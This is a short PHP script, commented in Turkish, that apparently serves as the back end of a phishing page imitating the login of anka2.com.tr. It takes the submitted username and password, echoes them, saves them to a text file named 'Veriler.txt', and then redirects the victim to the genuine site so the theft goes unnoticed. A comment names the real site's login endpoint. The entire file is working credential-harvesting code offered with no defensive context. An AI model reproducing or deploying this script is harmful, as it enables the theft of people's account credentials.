<?php



echo "Kullanıcı Adı: ".$_POST["login"]."<br>";
echo "Şifre: ".$_POST["password"];

$dosya=fopen("Veriler.txt","w+");  
fwrite($dosya, "Kullanıcı Adı: ".$_POST["login"]);
fwrite($dosya, "Şifre: ".$_POST["password"]);



header("Location: https://www.anka2.com.tr");




// https://www.anka2.com.tr/account/loginPost


